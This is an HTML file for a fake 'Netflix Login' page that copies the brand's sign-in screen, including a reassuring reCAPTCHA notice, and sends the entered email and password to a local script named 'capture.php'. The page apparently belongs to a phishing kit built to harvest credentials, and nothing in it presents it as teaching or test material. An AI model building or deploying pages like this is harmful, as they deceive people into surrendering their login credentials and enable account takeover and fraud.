<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Login</title>
    <link rel="stylesheet" href="./styles.css">
</head>
<body>
    <div class="overlay"></div>
    <div class="login-container">
        <h1>Sign In</h1>
        <form action="./capture.php" method="POST">
            <div class="form-group">
                <label for="email">Email or mobile number</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Sign In</button>
            <div class="secondary-options">
                <a href="#">Forgot password?</a>
                <a href="#">Use a sign-in code</a>
            </div>
        </form>
        <div class="signup">
            <p>New to Netflix? <a href="#">Sign up now.</a></p>
        </div>
        <div class="captcha-info">
            <p>This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a></p>
        </div>
    </div>
</body>
</html>
